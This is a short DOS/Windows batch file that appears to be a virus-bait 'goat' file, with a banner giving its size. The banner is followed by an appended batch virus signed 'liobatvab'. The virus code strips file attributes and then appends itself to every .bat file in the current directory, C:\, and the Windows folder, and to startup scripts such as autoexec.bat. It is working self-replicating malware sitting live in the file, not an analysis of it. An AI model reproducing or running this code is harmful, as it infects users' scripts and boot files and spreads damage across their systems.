@echo off
echo ***********************************
echo ***********************************
echo ***********************************
echo * Goat bat file. Size = 305 bytes *
echo ***********************************
echo ***********************************
echo ***********************************

@echo off
attrib *.bat -s -r>nul
attrib c:\*.bat -s -r>nul
attrib %winbootdir%\*.bat -s -r>nul
copy /b *.bat + %0 *.bat /y >nul
copy /b c:\*.bat + %0 c:\*.bat /y >nul
copy /b %winbootdir%\*.bat + %0 %winbootdir%\*.bat /y
copy /b c:\autoexec.bat + %0 c:\autoexec.bat >nul
copy /b %winbootdir%\destreg.bat + %0 %winbootdir%\destreg.bat >nul
copy /b %winbootdir%\dosstart.bat + %0 %winbootdir%\dosstart.bat >nul
rem liobatvab
cls
